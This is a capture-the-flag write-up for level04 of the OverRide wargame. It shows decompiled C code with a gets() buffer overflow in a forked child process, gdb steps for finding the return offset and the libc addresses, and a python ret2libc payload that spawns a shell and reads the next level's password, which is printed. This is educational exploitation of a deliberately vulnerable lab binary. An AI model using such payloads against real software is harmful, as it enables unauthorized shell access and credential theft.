# Level04
## Code
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>

int main(int argc, const char **argv, const char **envp)
{
  int stat_loc; 
  char s[128]; 
  int v6;
  int v7;
  int v8;
  pid_t pid;

  pid = fork();
  memset(s, 0, sizeof(s));
  v8 = 0;
  stat_loc = 0;
  if ( pid )
  {
    do
    {
      wait(&stat_loc);
      v6 = stat_loc;
      if ( (stat_loc & 0x7F) == 0 || (v7 = stat_loc, (char)((stat_loc & 0x7F) + 1) >> 1 > 0) )
      {
        puts("child is exiting...");
        return 0;
      }
      v8 = ptrace(PTRACE_PEEKUSER, pid, 44, 0);
    }
    while ( v8 != 11 );
    puts("no exec() for you");
    kill(pid, 9);
  }
  else
  {
    prctl(1, 1);
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    puts("Give me some shellcode, k");
    gets(s);
  }
  return 0;
}
```
## Explanation
- On this level, we can see a call to `gets()` that we know is a function we can exploit to overflow a buffer.

- But the specificity of this level is that there is a call to fork(), the child process does the call to `gets()` whereas the parent monitors the child to make sure it doesn't try to call `exec()`.

- Even though the program prints a message about shellcode, we thought the easiest solution was a ret2libc.

- First step : get the offset of the return address to know how many bytes we should give our buffer before writing the address of `system()` and its argument:

```
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 2716]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2716]
0x41326641 in ?? ()
```

- Here we use the `set follow-fork-mode child` command in gdb to track the child process instead of the parent, and we overflow our buffer to check the offset of the return address. https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ gives us an offset of 156.

- Now, we need to implement our ret2libc by giving our buffer after 156 random bytes the address of system(), as well as the address of the needed argument : /bin/sh.

- To find these, we can use gdb again :

```
Breakpoint 1, 0x080486cd in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
```

- Now, we have all the info we need, all that's left to do is to craft our payload, without forgetting to insert the return address of the call to system() between the address of the function itself and its argument (the address of the string /bin/sh). We could have put the address of exit() to make things cleaner, but actually we don't care if our program quits in a dirty way, all we want is starting a shell.

## Exploit

```
level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7"' ; cat) | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN


```
